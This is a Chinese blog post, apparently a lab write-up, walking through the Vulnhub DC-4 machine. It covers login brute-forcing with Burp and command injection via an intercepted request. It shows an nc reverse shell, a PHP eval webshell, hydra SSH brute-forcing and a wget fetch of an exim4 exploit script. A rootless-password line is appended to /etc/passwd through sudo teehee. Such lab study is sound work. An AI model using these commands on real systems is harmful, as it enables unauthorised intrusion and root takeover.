@@ -1,0 +1,296 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>DC-4靶机通关记录 | XiLitter</title><meta name="author" content="XiLitter"><meta name="copyright" content="XiLitter"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="靶场环境 局域网网段：192.168.47.0&#x2F;24 攻击机 kali：192.168.47.138&#x2F;24 目标器 DC-3：192.168.47.139&#x2F;24  打靶目标 找到藏在DC-4靶机中的flag，只有最终的flag。  信息收集已知目标机器和攻击机器在同一个局域网内，网段为192.168.47.0&#x2F;24。 寻找靶机真实IP同样使用nmap扫描网段">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC-4靶机通关记录">
+<meta property="og:url" content="https://xilitter.github.io/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="XiLitter">
+<meta property="og:description" content="靶场环境 局域网网段：192.168.47.0&#x2F;24 攻击机 kali：192.168.47.138&#x2F;24 目标器 DC-3：192.168.47.139&#x2F;24  打靶目标 找到藏在DC-4靶机中的flag，只有最终的flag。  信息收集已知目标机器和攻击机器在同一个局域网内，网段为192.168.47.0&#x2F;24。 寻找靶机真实IP同样使用nmap扫描网段">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xilitter.github.io/img/art/a7.jpg">
+<meta property="article:published_time" content="2023-07-18T03:19:32.000Z">
+<meta property="article:modified_time" content="2023-07-18T09:33:05.964Z">
+<meta property="article:author" content="XiLitter">
+<meta property="article:tag" content="vulnhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xilitter.github.io/img/art/a7.jpg"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://xilitter.github.io/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'DC-4靶机通关记录',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-07-18 17:33:05'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">45</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">31</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/friend/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/art/a7.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="XiLitter"><span class="site-name">XiLitter</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/friend/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">DC-4靶机通关记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-07-18T03:19:32.000Z" title="发表于 2023-07-18 11:19:32">2023-07-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-07-18T09:33:05.964Z" title="更新于 2023-07-18 17:33:05">2023-07-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/vulnhub%E9%9D%B6%E5%9C%BA/">vulnhub靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>5分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="DC-4靶机通关记录"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h3><blockquote>
+<p>局域网网段：192.168.47.0&#x2F;24</p>
+<p>攻击机 kali：192.168.47.138&#x2F;24</p>
+<p>目标器 DC-3：192.168.47.139&#x2F;24</p>
+</blockquote>
+<h3 id="打靶目标"><a href="#打靶目标" class="headerlink" title="打靶目标"></a>打靶目标</h3><blockquote>
+<p>找到藏在DC-4靶机中的flag，只有最终的flag。</p>
+</blockquote>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>已知目标机器和攻击机器在同一个局域网内，网段为192.168.47.0&#x2F;24。</p>
+<h4 id="寻找靶机真实IP"><a href="#寻找靶机真实IP" class="headerlink" title="寻找靶机真实IP"></a>寻找靶机真实IP</h4><p>同样使用nmap扫描网段内的ip，使用命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.47.0/24</span><br><span class="line">-sP参数常用于发现主机，而不进行端口扫描，使用ping，也就是发送icmp数据包，探测ip段内的主机是否在线</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/1.png" class>
+
+<p>目标机器IP：192.168.47.139</p>
+<h4 id="探测服务以及端口"><a href="#探测服务以及端口" class="headerlink" title="探测服务以及端口"></a>探测服务以及端口</h4><p>nmap使用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p- -v 192.168.47.139/24</span><br><span class="line">-A表示全面扫描，包括端口，服务，操作系统等等。-p-是扫描主机开放的全部端口，而不只是常见的端口。-v就是显示更详细的扫描结果和信息。</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/2.png" class>
+
+<p>靶机开放了web服务和ssh服务，web服务没有扫描到特定的框架。先游览器访问，</p>
+<img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/3.png" class>
+
+<p>打开就是登录框了，看来是要登录进去了，获取最终的flag。</p>
+<h3 id="寻找最终flag"><a href="#寻找最终flag" class="headerlink" title="寻找最终flag"></a>寻找最终flag</h3><h4 id="爆破账户密码"><a href="#爆破账户密码" class="headerlink" title="爆破账户密码"></a>爆破账户密码</h4><p>只有一个登录框，也没有别的什么目录文件，看来确实要登录进去了。要么弱口令要么爆破。弱口令试了几次没有成功，那么就开始爆破吧，针对于爆破，字典要选对。burp抓包，爆破，用户名就默认为admin</p>
+<img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/4.png" class>
+
+<p>以下这几个密码都可以登录进去，用happy作为密码登录</p>
+<img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/5.png" class>
+
+<p>登录成功。</p>
+<h4 id="命令执行getshell"><a href="#命令执行getshell" class="headerlink" title="命令执行getshell"></a>命令执行getshell</h4><p>点进去Command，发现可以执行三个命令，</p>
+<img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/6.png" class>
+
+<p>如果网站是在前端限制了我们执行的命令只能是这三个，那么我们就可以抓包修改任意命令执行了。</p>
+<img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/7.png" class>
+
+<p>可以任意命令执行，本来下一步尝试写马进去，可是根本写不进去。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;&lt;?php eval($_POST[123]);?&gt;&quot;&gt;123.php</span><br></pre></td></tr></table></figure>
+
+<p>后来才知道www-data的权限太低了，连文件都创建不了。看一下执行命令的代码逻辑：</p>
+<img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/8.png" class>
+
+<p>尝试使用反弹shell，把shell反弹到kali机上。kali机监听9955端口</p>
+<p>执行的命令为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.47.138 9955</span><br></pre></td></tr></table></figure>
+
+<p>注意在http报文中修改的时候将空格url编码一下。</p>
+<img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/9.png" class>
+
+<p>成功反弹到kali机上，老样子，优化一下shell</p>
+<img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/10.png" class>
+
+<p>下一步就得提权了。</p>
+<h4 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h4><p>这里看文章有两种提权的方法，索性都记录下来，增加知识面</p>
+<h5 id="hydra爆破ssh密码"><a href="#hydra爆破ssh密码" class="headerlink" title="hydra爆破ssh密码"></a>hydra爆破ssh密码</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hydra 是一个开源的密码爆破工具，用于渗透测试和安全评估。它被设计用于在授权范围内的测试中测试密码弱点，以帮助确认系统的安全性。</span><br><span class="line"></span><br><span class="line">Hydra 具有多协议支持，包括常见的协议和服务，如 SSH、FTP、HTTP、SMTP 等。它使用字典攻击和暴力破解等技术，尝试使用大量的用户名和密码组合来破解目标系统的认证机制。</span><br></pre></td></tr></table></figure>
+
+<p>ssh服务还没有用到，进入到home目录有三个用户，随便找找发现一个记录密码的备份文件</p>
+<img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/11.png" class>
+
+<p>把这些密码保存下来，可以作为爆破字典。接下来就用工具爆破jim的ssh密码。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l jim -P /home/xilitter/桌面/new_password.txt 192.168.47.139 ssh</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">说一下hydra工具的几个使用参数：</span><br><span class="line">-l 指定的用户名   -P 指定包含密码列表的文件  -t 指定并行线程数   -s 指定服务的端口号  -f 在成功找到用户名/密码组合后立即停止攻击  -e 指定要尝试的特定模块  -o 将结果保存到指定的输出文件中</span><br></pre></td></tr></table></figure>
+
+<p>爆破出了密码为jibril04。</p>
+<h5 id="ssh远程连接"><a href="#ssh远程连接" class="headerlink" title="ssh远程连接"></a>ssh远程连接</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh jim@192.168.47.139</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/12.png" class>
+
+<p>登录成功，随便找找发现charles用户的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/spool/mail</span><br></pre></td></tr></table></figure>
+
+<p>在此路径下的一封邮件里：</p>
+<img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/13.png" class>
+
+<p>Charles的密码为^xHhA&amp;hvim0y，尝试切换用户登录</p>
+<img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/14.png" class>
+
+<p>成功切换。</p>
+<h5 id="teehee提权"><a href="#teehee提权" class="headerlink" title="teehee提权"></a>teehee提权</h5><p>使用命令sudo -l查看一下该用户可以用特级权限使用哪些命令。</p>
+<img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/15.png" class>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">teehee是个小众的linux编辑器，如果它具有sudo权限，那么就可以利用并且提权。</span><br></pre></td></tr></table></figure>
+
+<p>使用以下命令提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;admin::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将admin::0:0:::/bin/bash写进/etc/passwd里</span><br><span class="line">&quot;admin&quot;是用户名，&quot;::&quot;是密码字段，表示没有设置密码。</span><br><span class="line">&quot;0:0&quot;是用户ID和组ID    &quot;::&quot;是用户信息字段</span><br><span class="line">&quot;/bin/bash&quot;是登录时使用的默认的shell</span><br><span class="line">没有设置密码的admin为管理员权限，运行shell即可提升权限</span><br></pre></td></tr></table></figure>
+
+<p>切换admin用户，成功提升权限。</p>
+<img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/16.png" class>
+
+<h4 id="exim4提权"><a href="#exim4提权" class="headerlink" title="exim4提权"></a>exim4提权</h4><p>记录一下另一种提权方法。</p>
+<p>当前权限：</p>
+<img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/17.png" class>
+
+<p>查看具有SUID权限的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/18.png" class>
+
+<p>exim4具有SUID权限，另外它也是可以用来提权的。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Exim4 是一个开源的邮件传输代理（Mail Transfer Agent，MTA），用于在 Unix/Linux 系统上路由和传递电子邮件。作为一个 MTA，Exim4 负责接收来自发送者的邮件，并将其传递给目标收件人的邮件服务器。</span><br></pre></td></tr></table></figure>
+
+<p>查看Exim4的版本</p>
+<img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/19.png" class>
+
+<p>从本地库中查找相关漏洞。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit exim 4 </span><br></pre></td></tr></table></figure>
+
+<img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20.png" class>
+
+<p>对应版本是有漏洞的，需要下载提权脚本到靶机。</p>
+<p>kali机开启web服务，因为需要靶机从我们的kali机上下载提权脚本，木马也写不进去，只能这么做了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start apache2.service  </span><br></pre></td></tr></table></figure>
+
+<p>将提权脚本复制到kali机的web根目录下面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/46996.sh /var/www/html </span><br></pre></td></tr></table></figure>
+
+<p>靶机从kali机上wget下载脚本，切换到tmp目录下进行下载，还是那句话，权限太低了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.47.138/46996.sh</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/21.png" class>
+
+<p>下载成功后，给脚本加执行权限，然后执行脚本</p>
+<img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/22.png" class>
+
+<p>成功提升权限。</p>
+<img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/23.png" class>
+
+<p>root目录下找到最后的flag，DC-4靶机通关结束。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://xilitter.github.io">XiLitter</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://xilitter.github.io/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/">https://xilitter.github.io/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xilitter.github.io" target="_blank">XiLitter</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/vulnhub/">vulnhub</a></div><div class="post_share"><div class="social-share" data-image="/img/art/a7.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/" title="fastjson反序列化&lt;=1.2.47绕过"><img class="cover" src="/img/art03.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">fastjson反序列化&lt;=1.2.47绕过</div></div></a></div><div class="next-post pull-right"><a href="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="DC-3靶机通关记录"><img class="cover" src="/img/art/a7.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">DC-3靶机通关记录</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/04/08/DC-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="DC-1靶机通关记录"><img class="cover" src="/img/art/a7.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-08</div><div class="title">DC-1靶机通关记录</div></div></a></div><div><a href="/2023/07/13/DC-2%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="DC-2靶机通关记录"><img class="cover" src="/img/art/a7.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-13</div><div class="title">DC-2靶机通关记录</div></div></a></div><div><a href="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="DC-3靶机通关记录"><img class="cover" src="/img/art/a7.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-17</div><div class="title">DC-3靶机通关记录</div></div></a></div><div><a href="/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" title="Evilbox打靶记录"><img class="cover" src="/img/art/a7.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-15</div><div class="title">Evilbox打靶记录</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">XiLitter</div><div class="author-info__description">且视他人之疑目如盏盏鬼火，大胆去走你的夜路。</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">45</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">31</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/XiLitter"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/XiLitter" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="/3336741183@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">换博客主题了，感觉还是这个主题更好看，而且功能也多，但是好多功能暂且没设置，以后再弄。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83"><span class="toc-number">1.</span> <span class="toc-text">靶场环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E9%9D%B6%E7%9B%AE%E6%A0%87"><span class="toc-number">2.</span> <span class="toc-text">打靶目标</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" 